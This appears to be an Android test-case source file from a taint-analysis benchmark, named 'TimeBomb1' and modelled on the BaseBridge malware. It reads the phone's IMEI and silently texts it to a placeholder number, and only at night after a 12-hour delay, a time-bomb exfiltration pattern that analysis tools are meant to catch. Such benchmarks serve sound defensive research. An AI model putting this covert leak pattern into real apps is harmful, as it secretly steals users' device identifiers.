
package de.ecspride;

import java.util.Date;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
/**
 * @testcase_name Manufacter and SDK version
 * Inspired by 096_BaseBridge-f8c3a32abf4ea4ea94ee5dc3c75801c90c6e1145/com/keji/fixedposition/BaseAActivity.java:127
 */
public class TimeBomb1 extends Activity {
	@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("IBM", "start");
        setContentView(R.layout.timebomb1);
		
        String imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source
		SmsManager sms = SmsManager.getDefault();		
		
    	SharedPreferences myPrefs = getPreferences(Context.MODE_PRIVATE);
    	SharedPreferences.Editor prefsEditor;  
		
        for(;;){  
    		long last = myPrefs.getLong("LastTry", 0L);
    		long current = System.currentTimeMillis();
        	Date date = new Date();
    		if(current - last > 43200000 ){
    			if(date.getHours()>23 || date.getHours()<5 ){
    				Log.d("IBM", "sending SMS: "+imei);
            		sms.sendTextMessage("+49 1234", null, imei, null, null);  //sink		
            		prefsEditor = myPrefs.edit();  
                	prefsEditor.putLong("LastTry", current);  
                	prefsEditor.commit();
            		Log.d("IBM", "end-ish");
    			}
            }
    	    try {
    	        Thread.sleep(7200000L);
       	    }
    	    catch (InterruptedException ex) {}
        }
    }
}
